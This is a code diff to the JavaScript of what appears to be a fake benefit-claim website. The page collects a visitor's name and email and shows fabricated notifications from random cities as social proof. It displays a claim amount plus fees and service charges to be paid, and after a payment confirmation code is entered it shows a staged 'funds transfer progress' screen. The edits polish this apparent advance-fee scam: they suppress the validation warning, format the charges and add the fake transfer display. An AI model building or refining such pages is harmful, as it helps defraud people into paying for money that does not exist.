@@ -79,10 +79,10 @@ document.addEventListener("DOMContentLoaded", () => {
     setTimeout(() => {
       toast.classList.add("fade-out");
       setTimeout(() => toast.remove(), 1000);
-    }, 5000);
+    }, 30000);
   }
 
-  setInterval(createToast, 5000);
+  setInterval(createToast, 30000);
 
   // Function to get a random city from a predefined list
   function getRandomCity() {
@@ -94,6 +94,9 @@ document.addEventListener("DOMContentLoaded", () => {
 
   eligibilityForm.addEventListener("submit", (e) => {
     e.preventDefault();
+    window.scrollTo(0,0);
+    landing.scrollTop -= 800;
+    
     const citizen = {
       name: document.querySelector("#beneficiaryName"),
       email: document.querySelector("#beneficiaryEmail"),
@@ -120,7 +123,7 @@ document.addEventListener("DOMContentLoaded", () => {
       
       localStorage.setItem("passedActive", JSON.stringify(citizenData));
     } else {
-      alert("Please enter only valid details!");
+      //alert("Please enter only valid details!");
     }
 
     let loadTime;
@@ -183,7 +186,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
     tin_text.textContent = `${tin}`;
 
-    amt_text.textContent = `Claim amount: $${amt}`;
+    amt_text.innerHTML = `Claim amount: <b>$${amt}</b>`;
     
     let fee_amt_ = 1.5/100 * amt;
     
@@ -195,11 +198,13 @@ document.addEventListener("DOMContentLoaded", () => {
     
     let total_charge_amt_ = fee_amt_ + service_charge_amt_;
     
-    total_charge_amt.textContent = `Total charges: $${total_charge_amt_}`;
+    total_charge_amt.innerHTML = `Total charges: <b>$${total_charge_amt_.toFixed(2)}</b>`;
     
-    popup_charge_amt.textContent = `$${total_charge_amt_}`;
+    popup_charge_amt.textContent = `$${total_charge_amt_.toFixed(2)}`;
     
-    location.reload();
+    setTimeout(() => {
+      location.reload();
+    }, 2000);
   }
   
   function populateDashboard(){
@@ -245,7 +250,7 @@ document.addEventListener("DOMContentLoaded", () => {
     
     console.log(amt)
     
-    amt_text.textContent = `Claim amount: $${amt}`;
+    amt_text.innerHTML = `Claim amount: <b>$${amt}</b>`;
     
     let fee_amt_ = 1.5/100 * amt;
     
@@ -257,9 +262,11 @@ document.addEventListener("DOMContentLoaded", () => {
     
     let total_charge_amt_ = fee_amt_ + service_charge_amt_;
     
-    total_charge_amt.textContent = `Total charges: $${total_charge_amt_}`;
+    total_charge_amt.innerHTML = `Total charges: <b>$${total_charge_amt_.toFixed(2)}</b>`;
     
-    popup_charge_amt.textContent = `$${total_charge_amt_}`;
+    popup_charge_amt.textContent = `$${total_charge_amt_.toFixed(2)}`;
+    
+    
   }
   
   populateDashboard();
@@ -302,10 +309,33 @@ document.addEventListener("DOMContentLoaded", () => {
   proceedBtn.addEventListener("click", () => {
     if (confirmationCodes.some(value => confirm_payment.value.includes(value))) {
       alert("Confirmation successful! 🎉");
+      const funds_transfer_progress = document.querySelector(".funds-transfer-progress");
+      funds_transfer_progress.classList.add("active");
+      paymentPopup.classList.remove("active");
+      window.scrollTo(0,0);
+      populateProgressMsg();
+      
+      localStorage.setItem("claimed", "200");
     } else if (confirm_payment.value == "") {
       alert("Please enter a confirmation code! 😉")
     } else {
       alert("Wrong code, try again! ⛔");
     }
   });
+  
+  function populateProgressMsg() {
+    const transfer_amt = document.querySelector(".transfer-amt");
+      
+    const amt = localStorage.getItem("amt");
+      
+    transfer_amt.innerHTML = `$${amt}`;
+    
+    if (localStorage.getItem("claimed")) {
+      const funds_transfer_progress = document.querySelector(".funds-transfer-progress");
+      
+      funds_transfer_progress.classList.add("active");
+    }
+  }
+  
+  populateProgressMsg();
 });
